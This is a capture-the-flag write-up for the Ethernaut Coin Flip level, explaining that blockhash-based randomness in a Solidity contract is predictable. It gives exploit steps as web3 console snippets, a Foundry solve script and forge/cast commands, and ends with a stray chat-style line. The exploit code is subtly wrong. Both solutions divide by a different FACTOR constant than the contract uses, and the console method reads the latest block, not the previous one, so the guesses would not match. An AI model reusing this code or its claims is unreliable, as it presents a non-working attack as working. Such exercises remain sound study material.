**Level 03 - Coin Flip (Ethernaut)**
====================================

**Overview**
------------

This level teaches about **bad randomness in blockchain**.

The contract uses block data to create randomness.

This is not safe.

**Objective:**

Win the game **10 times in a row**

## **Ethernaut Info**

This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

  Things that might help

See the "?" page above in the top right corner menu, section "Beyond the console"


**Contract**
------------

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```


**Vulnerability**
-----------------

The contract uses:

```
blockhash(block.number - 1)
```

This value is **not random**.

-   It is public

-   We can read it before calling the function

So we can always know the correct answer.


**Attack Strategy**
-------------------

Inside the contract:

```
uint256 coinFlip = blockValue / FACTOR;
```

We do the same calculation outside.

Steps:

1.  Read previous block hash

2.  Calculate result

3.  Send correct guess

4.  Repeat 10 times


**Exploit Steps**
-----------------

### **Method 1 --- Browser Console (Web3)**

#### **1\. Get block hash**

```
const block = await web3.eth.getBlock("latest")
const blockValue = block.hash
```


#### **2\. Calculate answer**

```
const FACTOR = web3.utils.toBN(
"115792089237316195423570985008687907852837564279074904382605163141518161494336"
)

const coinFlip = web3.utils.toBN(blockValue).div(FACTOR)
const guess = coinFlip.eq(web3.utils.toBN(1))
```


#### **3\. Call flip**

```
await contract.flip(guess)
```


#### **4\. Repeat 10 times**

Run again every block.


### **Method 2 --- Foundry**

#### **1\. Get block hash**

```
cast block latest
```


#### **2\. Solve using script**

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Solve is Script {

    uint256 FACTOR =
    115792089237316195423570985008687907852837564279074904382605163141518161494336;

    function run() external {
        address target = address(0x...);

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1;

        vm.startBroadcast();
        ICoinFlip(target).flip(guess);
        vm.stopBroadcast();
    }
}
```


#### **3\. Run script**

```
forge script script/Solve.s.sol --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast
```


#### **4\. Repeat 10 times**

Run the script each block until:

```
cast call $CONTRACT "consecutiveWins()(uint256)"
```

= 10


**Why This Works**
------------------

-   Blockchain data is public

-   blockhash is predictable

-   Contract uses it as randomness

So we can calculate the same result.

* * * * *

**Key Takeaways**
-----------------

-   Blockchain is deterministic

-   There is no true randomness on-chain

-   Do not use block values for randomness

-   Use secure randomness (e.g. Chainlink VRF)


**Tools**
---------

-   Browser console (web3)

-   Foundry (cast / forge)

-   RPC provider


**Summary**
-----------

The contract uses predictable data.

We:

-   read block hash

-   calculate result

-   always guess correct

-   win 10 times

* * * * *

Send next level when ready.